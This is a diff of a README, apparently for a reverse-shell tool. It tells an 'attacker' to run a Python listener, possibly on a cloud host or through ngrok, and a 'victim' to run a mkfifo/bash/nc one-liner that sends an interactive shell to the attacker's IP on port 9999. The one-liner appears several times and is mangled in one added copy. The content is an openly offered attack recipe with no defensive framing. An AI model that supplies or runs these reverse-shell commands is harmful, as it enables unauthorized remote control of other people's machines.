@@ -54,7 +54,28 @@ Makesure you add your ip to the victim's command.
 
 * And you can use linode, aws or google cloud services to make your cloud machine.
 
-      kali@attacker ~ $ python3 net.py 
-      kali@victim ~ $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <attacker ip> 9999 >/tmp/f  
+* You can even use ngrok tcp to use reverse - X
+
+# Vol 1.0 
+
+      kali@attacker - $ nano reverse.py
+      kali@attacker - $ < add your ip to the listen >
+      kali@attacker - $ python3 reverse.py
+      kali@victim - $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc <attacker ip> 9999 >/tmp/f  
+    
+    
+ # Vol 1.1
+ 
+      kali@attacker - $ python3 reverse.py
+      kali@victim - $ mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 ip> 9999 >/tmp/f
            
-Made with 💖 by THB
+           
+           
+           
+           
+</> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </>         
+</> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </> </>           
+ 
+           
+                      
+Made with 💖 by THB 
